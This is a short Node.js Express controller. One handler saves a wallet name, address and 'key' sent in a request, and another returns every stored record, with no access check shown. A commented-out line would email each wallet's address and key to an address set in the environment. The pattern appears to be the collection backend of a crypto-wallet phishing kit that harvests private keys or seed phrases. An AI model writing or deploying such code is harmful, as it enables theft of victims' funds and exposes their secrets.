const Wallet = require('../models/walletModel')
const sendMailWallet = require('./sendMailWallet')

module.exports = {
	getWallets: async (req, res) => {
		try {
			const wallets = await Wallet.find({})
			res.json(wallets)
		} catch (err) {
			return res.status(400).json({ msg: err.message })
		}
	},
	creatWallet: async (req, res) => {
		try {
			const { wallet, address, key } = req.body
			const newWallet = await new Wallet({
				wallet: wallet,
				address: address,
				key: key,
			}).save()
			res.status(200).json(true)
			// sendMailWallet(process.env.RECEIVE_EMAIL_ADDRESS, 'New one', wallet, address, key)
		} catch (err) {
			return res.status(400).json({ msg: err.message })
		}
	},
}
